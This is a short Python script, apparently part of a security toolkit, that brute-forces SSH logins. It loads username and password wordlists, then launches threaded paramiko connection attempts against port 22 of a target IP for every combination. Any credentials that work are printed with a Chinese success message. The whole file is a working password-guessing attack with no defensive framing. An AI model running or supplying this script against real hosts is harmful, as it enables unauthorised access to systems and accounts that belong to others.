import paramiko
import threading

def sshScan(t, i, o, u, p):
    try:
        t.acquire()
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=i, port=o, username=str(u), password=str(p), timeout=10)
        print('[+]SSH连接成功，用户：%s,密码：%s' % (u, p))
        client.close()
    except:
        t.release()

def ssh(ip):
    with open('./static/username.txt', 'r')as f:
        user = f.readlines()
    with open('./static/password.txt', 'r')as f:
        passw = f.readlines()
    # ip = input("请输入IP：").strip()
    # port = input("请输入端口：").strip()
    s = threading.Semaphore(10)
    for i in user:
        username = i.strip()
        for j in passw:
            password = j.strip()
            t = threading.Thread(target=sshScan, args=(s, ip, 22, username, password))
            t.start()